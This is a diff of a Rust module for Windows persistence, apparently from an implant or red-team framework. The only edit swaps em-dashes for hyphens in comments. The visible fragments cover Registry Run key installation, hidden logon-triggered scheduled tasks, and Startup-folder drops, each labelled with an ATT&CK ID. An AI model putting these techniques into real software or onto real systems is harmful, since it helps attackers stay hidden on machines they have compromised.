@@ -2,7 +2,7 @@
 //
 // Windows persistence implementations.
 //
-// Registry operations use raw Win32 via extern "system" — no extra crates,
+// Registry operations use raw Win32 via extern "system" - no extra crates,
 // consistent with the pattern in migrate.rs and injection/windows/.
 //
 // Scheduled tasks use the COM ITaskService API (windows crate) to avoid
@@ -127,7 +127,7 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
 const RUN_SUBKEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
 
-// ── T1547.001 — Registry Run Key ──────────────────────────────────────
+// ── T1547.001 - Registry Run Key ──────────────────────────────────────
 
 pub fn install_run(value_name: &str, binary_path: &str, use_hklm: bool) -> Result<String, String> {
     let stable = stable_drop(binary_path, value_name)?;
@@ -208,9 +208,9 @@ pub fn remove_run(value_name: &str, use_hklm: bool) -> Result<String, String> {
     }
 }
 
-// ── T1053.005 — Scheduled Task ────────────────────────────────────────
+// ── T1053.005 - Scheduled Task ────────────────────────────────────────
 //
-// MSVC builds use the COM ITaskService API (windows crate) — no schtasks.exe
+// MSVC builds use the COM ITaskService API (windows crate) - no schtasks.exe
 // child process is spawned.
 //
 // MinGW / cross-compiled builds (x86_64-pc-windows-gnu, used by the Docker
@@ -232,7 +232,7 @@ use windows::{
 
 fn build_task_xml(binary_path: &str) -> String {
     // Logon trigger, least-privilege, hidden, no execution time limit.
-    // <Hidden> suppresses the task from the Task Scheduler UI — commonly
+    // <Hidden> suppresses the task from the Task Scheduler UI - commonly
     // used by both attackers and legitimate maintenance software.
     format!(
         r#"<?xml version="1.0" encoding="UTF-16"?>
@@ -285,7 +285,7 @@ pub fn install_task(task_name: &str, binary_path: &str) -> Result<String, String
     install_task_schtasks(task_name, &stable, binary_path)
 }
 
-/// COM-based task creation — MSVC builds only.
+/// COM-based task creation - MSVC builds only.
 #[cfg(target_env = "msvc")]
 unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String, String> {
     let svc: ITaskService =
@@ -319,7 +319,7 @@ unsafe fn install_task_com(task_name: &str, binary_path: &str) -> Result<String,
     ))
 }
 
-/// schtasks.exe fallback — MinGW / cross-compiled builds.
+/// schtasks.exe fallback - MinGW / cross-compiled builds.
 /// Spawns a child process which is noisier than the COM path, but required
 /// because the windows crate does not support x86_64-pc-windows-gnu.
 #[cfg(not(target_env = "msvc"))]
@@ -394,12 +394,12 @@ fn remove_task_schtasks(task_name: &str) -> Result<String, String> {
     }
 }
 
-// ── T1547.009 — Startup Folder ────────────────────────────────────────
+// ── T1547.009 - Startup Folder ────────────────────────────────────────
 //
 // Copies the binary into the current-user startup folder.
 // Path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 // Executables placed directly in the startup folder are launched by
-// Explorer at logon — no shortcut (.lnk) needed for PE targets.
+// Explorer at logon - no shortcut (.lnk) needed for PE targets.
 
 fn startup_folder() -> Result<PathBuf, String> {
     let appdata = std::env::var("APPDATA")
